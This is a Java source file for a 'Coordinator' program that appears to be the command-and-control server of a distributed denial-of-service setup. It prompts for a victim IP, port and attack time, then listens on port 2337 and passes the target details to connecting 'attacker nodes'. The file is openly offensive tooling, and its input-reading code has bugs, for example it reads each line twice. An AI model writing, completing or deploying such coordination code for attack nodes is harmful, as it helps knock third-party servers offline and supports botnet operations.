/*
  The program needs to be run with the CoordinatingProtocol class.
  Ask for the desired target server, to carry out an attack on.
  This application doesnt need to always be on, just when you need to send information
  to attacker nodes. 
*/

import java.net.*;
import java.io.*;
import java.util.*;

public class Coordinator {
  public static int my_port = 2337;
  public static String victim_ip = "127.0.0.1"; //default
  public static int victim_port = 1337; //default
  public static String victim_time = "";

  /*
    Starts a server that accepts connections from attacker nodes, and will inform them
    of the attack information.
  */
  public static Runnable spawnAttackServer(Socket socket) {
    Runnable attackerHandler = new Runnable() {
      public void run() {
        //lets you know when an attacker client connects to find out target information.
        System.out.println("attack node connected.");
        //run the protocol.
        try (
            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
        ) {
            String outputLine;
            CoordinatingProtocol coordinating_protocol = new CoordinatingProtocol(victim_ip, victim_port, victim_time);

            while (true) {
                outputLine = coordinating_protocol.processInput();
                out.println(outputLine);
                if (outputLine.equals("Bye."))
                  break;
            }
            socket.close();
        } catch (IOException e) {
            e.getMessage();
        }
      }
    };
    return attackerHandler;
  }

  /* just startes the server. Makes for cleaner code. */
  public static void startServer() {
    try {
      ServerSocket serverSocket = new ServerSocket(my_port);
       while (true) {
         Runnable clientHandler = spawnAttackServer(serverSocket.accept());
         new Thread(clientHandler).start();
       }
     } catch (Exception e) {
       System.out.println("Error.");
     }
  }

  /*
    gets the inputs from the user, which will than be passed to the protocol class.
  */
  public static void getInput() {
    Scanner reader = new Scanner(System.in);
    System.out.print("Enter victim IP (default: " + victim_ip + ") : ");
    if (!reader.nextLine().equals("")) {
      victim_ip = reader.nextLine();
    }
    System.out.print("Enter victim port (default: " + victim_port + ") : " );
    if (reader.nextLine() == "") {
      victim_port = Integer.parseInt(reader.nextLine());
    }
    System.out.print("Enter time of attack (example: 06:57:22) : ");
    victim_time = reader.nextLine();
    if (victim_time.equals("")) {
      System.out.println("Empty input. Quitting program.");
      System.exit(-1);
    }
  }

  /*
    gets the user input. Informs the user what time the attack will occur. starts the server.
  */
  public static void main(String[] args) throws IOException {
    getInput();
    System.out.println("Starting Server, will attack at: " + victim_time);
    startServer();
  }
}
